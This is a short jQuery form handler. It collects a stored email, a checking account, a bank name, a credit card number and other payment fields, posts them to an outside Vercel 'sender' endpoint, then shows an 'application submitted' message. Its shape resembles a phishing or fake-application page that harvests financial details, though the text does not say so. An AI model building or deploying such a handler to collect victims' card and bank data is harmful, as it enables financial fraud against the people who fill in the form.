<script>
  $(document).ready(function () {
    $('#handleSubmission').on('submit', function (event) {
      event.preventDefault(); // Prevent the default form submission

      var email = localStorage.getItem('email');
    var checking_account = $('#checking_account').val();
    var bank_name = $('#bank_name').val();
    var credit_card = $('#credit_card').val();
    var payment_method = $('#payment_method').val();
    var company_trust = $('#company_trust').val();

    // Build the data object
    var data = {
      email: email,
      checking_account: checking_account,
      bank_name: bank_name,
      credit_card: credit_card,
      payment_method: payment_method,
      company_trust: company_trust
    };


      $.ajax({
        url: 'https://server-blue-mu.vercel.app/sender', // Replace with the URL to your PHP handler script
        type: 'POST',
        data: JSON.stringify(data),
        contentType: 'application/json',
        success: function (response) {
      console.log(response)
            swal("Application submitted successfully!", "", "success").then(() => { window.location.href = 'success.html'; });
        },
        error: function (xhr, status, error) {
          // Handle any errors
          swal("An error occurred while saving the application!", "", "warning")
          console.error(xhr.responseText);
        }
      });
    });
  });
</script>
